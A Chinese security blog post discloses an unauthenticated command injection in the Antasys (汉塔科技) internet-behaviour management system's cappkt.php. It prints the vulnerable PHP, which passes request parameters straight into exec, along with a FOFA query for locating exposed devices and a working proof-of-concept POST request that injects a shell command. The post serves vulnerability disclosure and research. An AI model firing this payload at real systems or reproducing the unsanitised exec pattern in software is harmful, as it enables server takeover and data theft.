---
title: "汉塔科技上网行为管理系统 cappkt.php 命令注入漏洞"
source: https://mrxn.net/jswz/antasys-dgn_tools-cappkt-rce.html
asset_dir: assets/汉塔科技上网行为管理系统-cappkt.php-命令注入漏洞
---

# 汉塔科技上网行为管理系统 cappkt.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/1 08:35
- 1131浏览
- [0评论](#comment)
- 11分钟阅读

深入探索

服务器

软件开发

软件

---

# 漏洞简介

汉塔科技 - 上网行为管理系统是上海汉塔网络科技有限公司开发的一款上网行为流量管理系统。其系统 `cappkt.php` 存在[命令注入](https://mrxn.net/tag/rce)漏洞，未授权攻击者可利用此漏洞在服务器上[执行](https://mrxn.net/tag/rce)任意系统命令，造成系统失陷、敏感数据泄露等高危风险。

代码安全审计

# 影响版本

# fofa语法

> `body="Antasys"`

# 漏洞分析

> 系统比较古老，使用的是威盾PHP混淆加密，可以参考[这篇文章](https://mrxn.net/jswz/antasys-dgn_tools-tracert-rce.html)附录部分代码进行批量解密或者使用参考链接部分进行在线单个文件解密。

直接看 `dgn/dgn_tools/cappkt.php` 的业务逻辑实现关键部分

深入探索

文件大小转换

恶意软件分析工具

安全研究工具

```
<?php

$itf = $_REQUEST['itf'];
$pktcnt = $_REQUEST['pktcnt'];
$txtip = $_REQUEST['txtip'];
$output = "";
$host = ($txtip ? "host $txtip" : "");
flush();
exec("kill -9 `ps -ef|grep tcpdump|grep -v grep|awk '{print $1}'`");
exec("tcpdump -i eth$itf $host -s 0 -c $pktcnt -w /www/doc/dd.pcap");
$output .= "ok";
flush();
sleep(1);
echo $output;;
echo ' 
'; ?>
```

通过 `$_REQUEST` 超全局变量获取 `itf` 、`pktcnt` 和 `txtip` 参数值后，就直接拼接进 exec函数进行[命令执行](https://mrxn.net/tag/rce)，无任何过滤，造成命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /dgn/dgn_tools/cappkt.php HTTP/1.1
Host: antasys.test
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded

itf=127.1;touch /tmp/xxx;%20%23%20&pktcnt=1&txtip=10
```

三个个参数均存在命令注入

漏洞修复方案

## itf

[![汉塔科技上网行为管理系统 cappkt.php 命令注入漏洞](images/img-001-cd2242f60612.webp)](https://image.mrxn.net/dc52914930274de1a58a810673f6c0f3.webp)

pktcnt 和 txtip 也是存在同样的命令注入漏洞。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.itf](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
